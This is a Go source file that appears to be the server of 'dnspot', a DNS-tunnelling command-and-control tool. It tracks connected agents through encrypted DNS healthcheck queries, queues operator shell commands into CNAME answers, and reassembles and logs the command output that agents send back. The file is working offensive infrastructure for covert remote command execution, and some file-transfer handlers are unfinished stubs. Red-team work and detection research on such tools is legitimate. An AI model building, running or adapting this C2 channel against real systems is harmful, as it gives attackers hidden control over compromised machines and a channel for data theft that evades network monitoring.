package server

import (
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"math"
	"os"
	"strings"
	"time"

	log "github.com/sirupsen/logrus"

	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/conf"
	"github.com/mosajjal/dnspot/cryptography"

	"github.com/spf13/cobra"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

var ServerPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

//3d buffer for public key and parentpartID. first string is the public key
var outgoingBuffer = make(map[string]map[uint16][]string)

type agentStatusForServer struct {
	LastAckFromAgentServerTime      uint32
	LastAckFromAgentPacketTime      uint32
	NextMessageType                 c2.MessageType
	NextParentPartId                uint16
	HealthCheckIntervalMilliSeconds uint32
}

// first string is the public key
var ConnectedAgents = make(map[string]agentStatusForServer)

// log received healthcheck
func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	log.Infof("Healthcheck, coming from %s", Packet.Signature)
	//register new agent in agent list
	agent, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)

		UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(ConnectedAgents)+65), nil)
		ConnectedAgents[Packet.Signature.String()] = agentStatusForServer{
			NextMessageType:                 c2.MessageHealthcheck,
			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
		}
	}
	// agent already exists, only update the timestamps and prepare the next packet based on message type
	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
	ConnectedAgents[Packet.Signature.String()] = agent
	if agent.NextMessageType == c2.MessageHealthcheck { // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
		payload := []byte("Pong!")
		// check time difference between packet time nad server time. anything after 10 seconds is unacceptable
		// todo: fix this before removing the comment
		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
			agent.NextMessageType = c2.MessageSyncTime
			ConnectedAgents[Packet.Signature.String()] = agent
			// change payload to a UTC timestamp just in case the agent works better with payload than server's timestamp
			payload = []byte(time.Now().Format("2006-01-02T15:04:05-0700"))
		}
		//todo: should we pass it on to MessageSyncTimeHandler function here?

		// todo: check the actual next message time here and send a message appropriately
		log.Infof("preparing a response for a healthcheck message")
		msg := c2.MessagePacket{
			TimeStamp:   uint32(time.Now().Unix()),
			MessageType: agent.NextMessageType,
		}
		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
		if err != nil {
			log.Errorf("Error preparing a response for a healthcheck message: %s", err.Error())
			return err
		}

		for _, A := range Answers {
			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
			if err != nil {
				log.Warnf("Error: %v", err) //todo:fix
			}
			q.Answer = append(q.Answer, cname)
		}
		// the MessageExecuteCommand here would only happen for the first packet. after this it's gonna be handled elsewhere
	} else if agent.NextMessageType == c2.MessageExecuteCommand { // we should check the buffer for this public key and pop the item in order and send it through
		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][0])) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)

		// todo: cleanup if it's more than one part (potentially this will work?)
	}

	return nil
}

func MessageGetFileFromAgnet(payload []byte, firstPacket c2.MessagePacketWithSignature) error {
	// if ParentPartID = 0 -> single packet
	// if ParentPartID != 0 -> incoming packets in the order of their PartID
	// if IsLastPart == true -> last packet
	// successful request incoming, need to see which packet are we dealing with
	// if o.Msg.ParentPartID != 0 { // multi part
	// 	//fist and middle packets
	// 	handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)] = append(handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)], o)
	// 	if o.Msg.IsLastPart {
	// 		executeFunction(handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)])
	// 	}
	// 	//todo: prepare response
	// 	return nil
	// } else { // single packet
	// 	executeFunction([]c2.MessagePacketWithSignature{o})
	// 	// todo: prepare response
	// }
	return nil
}

func SendFileToAgent(payload []byte, firstPacket c2.MessagePacketWithSignature) error {
	return nil
}

// shows the output of any command run by agent and sent back to us.
func displayCommandResult(fullPayload []byte) {
	// probably should save this in a temp file rather than log. //todo
	if len(fullPayload) > conf.CompressionThreshold {
		rdata := bytes.NewReader(bytes.Trim(fullPayload, "\x00"))
		r, _ := gzip.NewReader(rdata)
		s, _ := ioutil.ReadAll(r)
		log.Info("showing decompressed result") //todo:remove
		log.Warn(string(s))
	} else {
		log.Warnf(string(bytes.Trim(fullPayload, "\x00")))
	}
}

func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	_, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Errorf("Agent not recognized")
	}
	// handle multipart incoming
	ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)] = append(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)], Packet)
	// if Packet.Msg.ParentPartID != 0 { // multi part
	//fist and middle packets
	msg := c2.MessagePacket{
		TimeStamp:    uint32(time.Now().Unix()),
		MessageType:  c2.MessageExecuteCommandRes,
		ParentPartID: Packet.Msg.ParentPartID,
		PartID:       Packet.Msg.PartID,
	}
	payload := []byte("Ack!")
	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
		msg.IsLastPart = true
		agent := ConnectedAgents[Packet.Signature.String()]
		agent.NextMessageType = c2.MessageHealthcheck
		ConnectedAgents[Packet.Signature.String()] = agent
		payload = []byte("Ack! Last Part")
	}
	// log.Infof("sending plyload %#v\n", msg)
	// time.Sleep(2 * time.Second)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
		return nil
	}
	// }

	fullPayload := make([]byte, 0)
	packets := c2.CheckMessageIntegrity(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)])
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// todo: clean the memory for this parentpartID
	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
	displayCommandResult(fullPayload)
	// remove the buffer from memory
	delete(ServerPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
	return nil
}

// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) error {
	log.Infof("invoking command '%s' for the client", command)
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageExecuteCommand,
	}
	// As part of the incoming packet, we'll get the partid as well as parentPartId so we know which part to send next. we just need to cache the whole partition up
	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msg, []byte(command), conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, agentPublicKey)
	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
	//todo: what are we getting from the client? let's decrypt and log those

	if targetBuffer, ok := outgoingBuffer[agentPublicKey.String()][parentPartId]; ok {
		if parentPartId == 0 {
			// if there was a single packet living in the cache before, delete it before proceed
			// todo: maybe this is the place for this but I think it's better to be cleaned up elsewhere
			// delete(outgoingBuffer[agentPublicKey.String()], parentPartId)
			outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
			outgoingBuffer[agentPublicKey.String()][parentPartId] = append(outgoingBuffer[agentPublicKey.String()][parentPartId], Answers[0])
		}
		log.Errorf("key and ParentPartId already exists in the buffer. Please try again")

	} else {
		//initialize the map
		outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
		targetBuffer = append(targetBuffer, Answers...)
		outgoingBuffer[agentPublicKey.String()][parentPartId] = targetBuffer
	}
	log.Infof("command was successfully added to outgoing buffer to be sent")

	// set NextMessageType to let the healthcheck responder know
	agent := ConnectedAgents[agentPublicKey.String()]
	agent.NextMessageType = c2.MessageExecuteCommand
	agent.NextParentPartId = parentPartId
	ConnectedAgents[agentPublicKey.String()] = agent
	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
	// todo: set interval before returning the packet
	return nil

}

// remove idle agents after 60 seconds
func RemoveIdleAgents() {
	log.Infof("Removing idle agents")
	for k, v := range ConnectedAgents {
		idleTime := time.Now().Unix() - int64(v.LastAckFromAgentServerTime)
		if idleTime > 60 {
			log.Infof("removing agent %s since it has been idle for %d seconds", k, idleTime)
			delete(ConnectedAgents, k)
			for i := range UiAgentList.FindItems(k, "", false, true) {
				UiAgentList.RemoveItem(i)
			}
		}
	}
}

// handle incoming "ack" packets of multipart RunCommand packets from agents
func HandleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := ConnectedAgents[Packet.Signature.String()]
	acknowledgedId := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
		return nil
	}
	if Packet.Msg.IsLastPart {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartId)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1]))
	if err != nil {
		log.Warnf("Error: %v", err) //todo:fix
	}
	// todo: go back to hne healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	return nil
}

func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg, durationMilliseconds uint32) error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageSetHealthInterval,
	}
	payload := []byte{}
	binary.BigEndian.PutUint32(payload, durationMilliseconds)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

func executeFunction(packets []c2.MessagePacketWithSignature) error {
	fullPayload := make([]byte, 0)
	packets = c2.CheckMessageIntegrity(packets)
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	log.Warnf("%s, coming from %s\n", fullPayload, packets[0].Signature.String())
	// todo: clean the memory for this parentpartID
	return nil
}

func cleanupBuffer(timeout time.Duration) error {
	return nil //todo
}

func parseQuery(m *dns.Msg) error {
	outs, err := c2.DecryptIncomingPacket(m, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, nil)
	if err != nil {
		log.Infof("Error in Decrypting incoming packet: %v", err)
	}
	for _, o := range outs {
		switch msgType := o.Msg.MessageType; msgType {
		case c2.MessageHealthcheck:
			return MessageHealthcheckHandler(o, m)
		case c2.MessageExecuteCommand:
			return HandleRunCommandAckFromAgent(o, m)
		case c2.MessageExecuteCommandRes:
			return HandleRunCommandResFromAgent(o, m)
		case c2.MessageClientGetFile:
			return nil // todo
		case c2.MessageClientSendFile:
			return nil // todo
		case c2.MessageSetHealthInterval:
			return nil //
		case c2.MessageSyncTime:
			return nil // automatically done as part of routine healthcheck
		}

	}

	// }
	//todo: prepare response
	return nil
}

func handle53(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		err := parseQuery(m)
		if err != nil {
			log.Warnf("bad request: %s", err)
		}
	}
	w.WriteMsg(m)
}

func runDns(cmd *cobra.Command) {

	dns.HandleFunc(".", handle53)

	// start server
	server := &dns.Server{Addr: conf.GlobalServerConfig.ListenAddress, Net: "udp"}
	log.Infof("Started DNS on %s -- listening", server.Addr)
	err := server.ListenAndServe()
	errorHandler(err)
	defer server.Shutdown()

}

func RunServer(cmd *cobra.Command, args []string) {
	// set global flag that we're running as server
	conf.Mode = conf.RunAsServer
	log.SetLevel(log.Level(conf.GlobalServerConfig.LogLevel))

	if conf.GlobalServerConfig.LogFile != "" {
		f, err := os.OpenFile(conf.GlobalServerConfig.LogFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Fatalf("error opening file: %v", err)
		}
		mw := io.MultiWriter(UiLog, f)
		log.SetOutput(mw)
	} else {
		log.SetOutput(UiLog)
	}

	var err error
	conf.GlobalServerConfig.ListenAddress, err = cmd.Flags().GetString("listenAddress")
	errorHandler(err)

	conf.GlobalServerConfig.PrivateKeyBasexx, err = cmd.Flags().GetString("privateKey")
	errorHandler(err)
	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyBasexx)
	errorHandler(err)

	// todo: public keys

	dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
	errorHandler(err)
	if !strings.HasSuffix(dnsSuffix, ".") {
		dnsSuffix = dnsSuffix + "."
	}
	if !strings.HasPrefix(dnsSuffix, ".") {
		dnsSuffix = "." + dnsSuffix
	}
	conf.GlobalServerConfig.DnsSuffix = dnsSuffix

	go runDns(cmd)
	RunTui()

}
